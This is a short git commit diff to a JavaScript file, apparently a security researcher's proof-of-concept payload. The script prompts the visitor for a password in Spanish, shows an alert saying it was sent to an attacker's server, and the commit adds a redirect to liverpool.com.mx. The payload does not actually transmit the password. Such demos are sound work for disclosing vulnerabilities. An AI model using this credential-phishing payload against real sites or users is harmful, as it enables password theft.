e4db0cdfa4ae5f0bd37d73f7d73773111c3aa21e
Omar Espino <omespino@gmail.com>
2024-09-05 13:09:05 -0700

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,2 +1,3 @@
 var pass=prompt('Para continuar inserta tu contraseña');
 alert('contraseña: ' + pass+ ', enviada al server del atacante @ omespino websec');
+window.location='https://liverpool.com.mx/';
